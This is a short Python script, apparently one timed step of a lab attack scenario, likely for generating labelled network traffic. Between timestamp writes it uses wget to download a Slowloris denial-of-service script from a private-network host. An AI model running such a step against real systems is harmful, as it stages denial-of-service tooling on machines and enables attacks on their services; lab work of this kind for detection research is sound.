import time
import sys
import os
import subprocess


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    time.sleep(2)
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(120)

    try:
        download_the_app = 'wget http://192.168.56.132/local_slowloris.py'
        subprocess.run(download_the_app.split(), stdout=subprocess.PIPE)
        
    except Exception as e:
        print(e)
        pass
    
    
    output_time_file_end = 'time_step_6_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(120)



main(sys.argv)
